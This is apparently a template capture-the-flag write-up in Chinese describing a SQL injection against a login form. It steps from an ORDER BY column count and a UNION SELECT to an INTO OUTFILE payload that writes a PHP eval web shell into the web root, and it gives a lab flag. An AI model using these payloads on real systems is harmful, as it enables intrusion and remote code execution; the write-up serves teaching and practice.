# [示例] SQL 注入 —— 万能密码到文件写入

> 本篇为模板示例，展示一篇标准 Writeup 的样子。难度：⭐⭐ | 考点：`SQLi` `UNION` `INTO OUTFILE`

## 题目描述

登录框存在注入点，目标获取 flag 文件。

## 解题思路

### 1. 判断注入

输入 `'` 报错，说明参数直接拼接进 SQL，存在字符型注入。

### 2. 确认列数

```sql
' ORDER BY 3 --+      # 正常
' ORDER BY 4 --+      # 报错 → 3 列
```

### 3. UNION 查数据

```sql
' UNION SELECT 1,database(),3 --+
```

### 4. INTO OUTFILE 写 Shell

```sql
' UNION SELECT 1,'<?php @eval($_POST[1]);?>',3 INTO OUTFILE '/var/www/html/shell.php' --+
```

## Flag

```
flag{sql1_m4p_t0_0utf1le}
```

## 总结

- `ORDER BY` 猜列数 → `UNION` 联查 → `INTO OUTFILE` 写文件是注入拿 shell 的经典链路
- 前提：`secure_file_priv` 为空且有写权限，实战中先确认这两个条件
